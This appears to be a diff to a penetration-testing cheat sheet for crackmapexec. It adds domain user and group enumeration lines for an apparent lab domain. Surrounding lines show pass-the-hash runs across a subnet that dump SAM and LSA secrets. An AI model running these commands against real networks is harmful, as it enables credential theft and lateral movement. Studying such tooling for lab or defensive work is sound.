@@ -82,8 +82,10 @@ crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth
 crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth --sam
 crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth --shares
 crackmapexec smb 192.168.0.0/24 -u administrator -H <NTLM-HASH> --local-auth --lsa
+crackmapexec smb 192.168.154.134/24 -u Administrator -d MARVEL.local -p P@\$\$w0rd --users
+crackmapexec smb 192.168.154.134/24 -u Administrator -d MARVEL.local -p P@\$\$w0rd --groups                                                                                           
 
-#Checkout module of particular ip address.
+#Checkout module of particular protocol.
 crackmapexec smb -L
 
 #using the modules
